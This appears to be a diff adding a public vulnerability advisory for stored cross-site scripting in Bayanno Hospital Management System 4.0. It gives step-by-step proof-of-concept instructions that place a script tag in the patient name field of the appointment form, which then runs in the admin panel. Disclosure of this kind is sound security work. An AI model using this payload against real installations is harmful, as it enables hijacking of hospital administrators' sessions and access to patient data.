@@ -1,0 +1,23 @@
+# Exploit Title: Bayanno Hospital Management System 4.0 - Cross-Site Scripting
+# Date: 2018-09-05
+# Software Link: https://codecanyon.net/item/bayanno-hospital-management-system/5814621
+# Exploit Author: Gokhan Sagoglu
+# Vendor Homepage:: http://creativeitem.com/
+# Version: v4.0
+# Live Demo: http://creativeitem.com/demo/bayanno/index.php?home
+# Category: webapps
+
+# 1. Description
+# Due to improper user input management and lack of output encoding, unauthenticated users are able 
+# to inject malicious code via making an appointment. Malicious code runs on admin panel.
+
+# 2. PoC
+
+- To make an appointment go to: /bayanno/index.php?home/appointment
+- Select “New Patient”.
+- Type <script>alert(1)</script> as name.
+- Fill the other fields with proper values.
+- Click on “Book Now” button.
+- Go to admin panel and login as admin: /bayanno/index.php?login
+- To view patients go to: /bayanno/index.php?admin/patient
+- Malicious script will run.
